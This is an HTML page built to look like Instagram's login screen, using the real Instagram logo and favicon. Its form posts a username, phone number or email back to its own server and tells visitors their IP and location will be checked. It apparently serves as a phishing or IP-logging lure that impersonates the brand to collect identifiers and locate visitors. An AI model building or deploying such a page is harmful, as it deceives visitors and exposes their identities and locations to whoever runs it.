<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            display: flex;
            justify-content: center;
            margin-top: 50px;
        }
        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 100%;
            max-width: 350px;
            text-align: center;
        }
        .logo {
            background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png');
            background-repeat: no-repeat;
            background-size: contain;
            height: 51px;
            margin: 22px auto 12px auto;
            width: 175px;
        }
        input {
            width: 100%;
            padding: 9px 8px;
            margin: 6px 0;
            border: 1px solid #dbdbdb;
            background-color: #fafafa;
            border-radius: 3px;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 9px;
            margin-top: 10px;
            background-color: #3897f0;
            border: none;
            color: white;
            font-weight: bold;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
        }
        .or-divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 10px 0;
        }
        .or-divider::before, .or-divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .or-divider span {
            margin: 0 10px;
            color: #8e8e8e;
            font-weight: 500;
        }
        .note {
            margin-top: 20px;
            font-size: 0.85rem;
            color: #999;
        }
        .signup-link {
            margin-top: 20px;
            font-size: 14px;
        }
        .signup-link a {
            text-decoration: none;
            color: #00376b;
            font-weight: 500;
        }

        @media (max-width: 500px) {
            .container {
                padding: 20px;
                margin-top: 20px;
            }
            .login-container {
                padding: 20px;
                margin-top: 30px;
                border: none;
                box-shadow: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <div class="logo"></div>
            <form method="POST">
                <input type="text" name="name" placeholder="Phone number, username, or email" required>
                <input type="email" name="email" placeholder="Email (optional)">
                <button type="submit">Log In</button>
            </form>
            <div class="or-divider"><span>OR</span></div>
            <div class="note">
                Your IP and location will be verified for security reasons.
            </div>
            <div class="signup-link">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </div>
    </div>
</body>
</html>
